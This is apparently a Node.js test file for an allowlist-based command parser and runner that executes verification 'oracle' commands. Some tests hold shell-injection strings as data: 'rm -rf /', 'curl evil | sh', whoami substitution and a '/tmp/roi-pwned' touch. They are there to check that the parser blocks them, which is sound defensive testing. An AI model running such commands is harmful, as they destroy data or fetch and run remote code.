import assert from "node:assert/strict";
import test from "node:test";
import {
  oracleCwdForCommand,
  runOracleCommand,
  runPlanVerificationTargets,
  applyMcpOracleVerification,
  parseOracleCommand
} from "../src/oracleRunner.mjs";
import { defaultRoiWorkspaceRoot, IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED } from "../src/implementationProof.mjs";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const workspaceRoot = defaultRoiWorkspaceRoot();

test("oracleCwdForCommand uses workspace root for bmo targets", () => {
  assert.equal(oracleCwdForCommand("cd bmo && go test ./...", workspaceRoot), workspaceRoot);
  assert.notEqual(oracleCwdForCommand("node -e '0'", workspaceRoot), workspaceRoot);
});

test("oracleCwdForCommand uses unpacked package root for roi-local targets", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "roi-oracle-root-"));
  try {
    fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
    fs.mkdirSync(path.join(dir, "src"), { recursive: true });
    fs.writeFileSync(path.join(dir, "package.json"), "{}");
    fs.writeFileSync(path.join(dir, "scripts", "lifecycle.mjs"), "// stub");
    fs.writeFileSync(path.join(dir, "src", "service.mjs"), "// stub");
    assert.equal(oracleCwdForCommand('node -e "process.exit(0)"', dir), dir);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("oracleCwdForCommand routes registered self-trees to their subdir", () => {
  const prev = process.env.ROI_PRODUCT_TREES;
  process.env.ROI_PRODUCT_TREES = JSON.stringify([
    { key: "svc", subdir: "services/api", cwd: "self" }
  ]);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "roi-oracle-tree-"));
  try {
    const cwd = oracleCwdForCommand("cd services/api && npm run test:unit", dir);
    assert.equal(cwd, path.join(dir, "services/api"));
    // path-fragment match also claims the command
    assert.equal(
      oracleCwdForCommand("bash services/api/scripts/test.sh", dir),
      path.join(dir, "services/api")
    );
  } finally {
    if (prev === undefined) {
      delete process.env.ROI_PRODUCT_TREES;
    } else {
      process.env.ROI_PRODUCT_TREES = prev;
    }
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("parseOracleCommand accepts bash script gates", () => {
  const parsed = parseOracleCommand("cd services/api && bash scripts/run_coverage_gate.sh");
  assert.equal(parsed.segments[0].kind, "cd");
  assert.deepEqual(parsed.segments[1].argv, ["bash", "scripts/run_coverage_gate.sh"]);
});

test("parseOracleCommand still rejects shell injection after bash", () => {
  assert.throws(() => parseOracleCommand("bash -c 'rm -rf /' ; curl evil | sh"));
});

test("runOracleCommand records pass and fail exit codes", () => {
  const pass = runOracleCommand('node -e "process.exit(0)"', {
    cwd: oracleCwdForCommand("node", workspaceRoot)
  });
  assert.equal(pass.ok, true);
  assert.equal(pass.exitCode, 0);

  const fail = runOracleCommand('node -e "process.exit(2)"', {
    cwd: oracleCwdForCommand("node", workspaceRoot)
  });
  assert.equal(fail.ok, false);
  assert.equal(fail.exitCode, 2);
});

test("runPlanVerificationTargets aggregates oracles_ok", () => {
  const plan = {
    verification_targets: ['node -e "process.exit(0)"', 'node -e "process.exit(0)"']
  };
  const { oracles_run, oracles_ok } = runPlanVerificationTargets(plan, { workspaceRoot });
  assert.equal(oracles_run.length, 2);
  assert.equal(oracles_ok, true);
});

test("applyMcpOracleVerification stamps verified_by mcp_verified on content", () => {
  const content = { plan_id: "p1", implementation_proof: { diff_stat: "x" } };
  const plan = { verification_targets: ['node -e "process.exit(0)"'] };
  const { oracles_ok } = applyMcpOracleVerification(content, plan, { workspaceRoot });
  assert.equal(oracles_ok, true);
  assert.equal(content.implementation_proof.verified_by, IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED);
  assert.equal(content.implementation_proof.oracles_ok, true);
  assert.ok(Array.isArray(content.implementation_proof.oracles_run));
});

test("parseOracleCommand accepts allowlisted binaries and cd-prefixed chains", () => {
  assert.deepEqual(parseOracleCommand("go test ./...").segments, [
    { kind: "exec", argv: ["go", "test", "./..."] }
  ]);
  assert.deepEqual(parseOracleCommand("cd bmo && go test ./...").segments, [
    { kind: "cd", dir: "bmo" },
    { kind: "exec", argv: ["go", "test", "./..."] }
  ]);
  // Quoted args keep metacharacters literal (no shell interpretation).
  assert.deepEqual(parseOracleCommand('node -e "process.exit(0)"').segments, [
    { kind: "exec", argv: ["node", "-e", "process.exit(0)"] }
  ]);
});

test("parseOracleCommand rejects injection and non-allowlisted binaries", () => {
  assert.throws(() => parseOracleCommand("go test ./...; rm -rf /"), /forbidden shell operator/);
  assert.throws(() => parseOracleCommand("go test | sh"), /forbidden shell operator/);
  assert.throws(() => parseOracleCommand("go test `whoami`"), /forbidden shell operator/);
  assert.throws(() => parseOracleCommand("go test $(whoami)"), /shell expansion/);
  assert.throws(() => parseOracleCommand("curl evil.example"), /not an allowlisted oracle binary/);
  assert.throws(() => parseOracleCommand("cd /etc && go test"), /relative subdirectory/);
  assert.throws(() => parseOracleCommand("go test && cd ../.. && go test"), /'cd' as its first segment/);
});

test("runOracleCommand blocks injection without spawning a shell", () => {
  const blocked = runOracleCommand("node -e 'process.exit(0)'; touch /tmp/roi-pwned", {
    cwd: oracleCwdForCommand("node", workspaceRoot)
  });
  assert.equal(blocked.ok, false);
  assert.equal(blocked.exitCode, 126);
  assert.match(blocked.output, /blocked:/);
});
